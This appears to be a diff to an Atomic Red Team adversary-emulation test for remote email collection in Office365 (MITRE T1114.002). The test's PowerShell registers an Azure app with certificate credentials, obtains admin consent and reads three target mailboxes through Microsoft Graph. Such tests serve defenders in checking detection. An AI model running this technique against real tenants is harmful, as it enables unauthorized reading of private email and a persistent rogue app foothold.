@@ -44,25 +44,23 @@ atomic_tests:
       connect-mggraph -Scopes AppRoleAssignment.ReadWrite.All,Application.ReadWrite.All,User.Read -NoWelcome
       $context = Get-MgContext       
       $users = get-MgUser
-      $app = New-MgApplication -DisplayName "T1114.002 Atomic Test #12 - Office365 - Remote Email Collection" -RequiredResourceAccess $reqResourceAccess -Web @{ RedirectUris="http://localhost"; } -KeyCredentials @(@{ Type="AsymmetricX509Cert"; Usage="Verify"; Key=$cert.RawData })
+      $app = New-MgApplication -DisplayName "T1114.002 Atomic Test #1 - Office365 - Remote Email Collection" -RequiredResourceAccess $reqResourceAccess -Web @{ RedirectUris="http://localhost"; } -KeyCredentials @(@{ Type="AsymmetricX509Cert"; Usage="Verify"; Key=$cert.RawData })
       New-MgServicePrincipal -AppId $app.appId -AdditionalProperties @{} | Out-Null
       $adminConsentUrl = "https://login.microsoftonline.com/" + $context.TenantId + "/adminconsent?client_id=" + $app.appId
       Start-Process $adminConsentUrl
       Read-Host -Prompt "After browser log-in, press Enter to Continue" 
       Write-Host "Enter 3 email addresses in the tenant"
-      $mailbox1 = Read-Host -Prompt 'Enter the first email address'
-      $mailbox2 = Read-Host -Prompt 'Enter the second email address'
-      $mailbox3 = Read-Host -Prompt 'Enter the third email address'
+      $mailbox1 = "#{1st_target_mailbox}"
+      $mailbox2 = "#{2nd_target_mailbox}"
+      $mailbox3 = "#{3rd_target_mailbox}"
       [System.Collections.ArrayList]$selectUsers = @()
       foreach ($user in $users) {if (($user.Mail -eq $mailbox1) -Or ($user.Mail -eq $mailbox2) -Or ($user.Mail -eq $mailbox3)){$selectUsers.Add($user.id)}}
       connect-mggraph -ClientId $app.AppId -TenantId $context.TenantId -CertificateName $cert.Subjectname.Name
       foreach ($user in $selectUsers) { $url= "https://graph.microsoft.com/v1.0/users/$($user)/messages" ; Invoke-MgGraphRequest -Uri $url -Method GET -OutputType PSObject}
     cleanup_command: |
-      Install-Module Microsoft.Graph -Scope CurrentUser
       connect-mggraph -Scopes AppRoleAssignment.ReadWrite.All,Application.ReadWrite.All,User.Read -NoWelcome
       Remove-MgApplication $app.AppId
       Remove-Item -Path Cert:\CurrentUser\My\$($cert.thumbprint) -DeleteKey
       Disconnect-MgGraph
-      Remove-Variable -Name cert,reqResourceAccess,context,users,app,selectUsers,adminConsentUrl,mailbox1,mailbox2,mailbox3
     name: powershell
     elevation_required: false
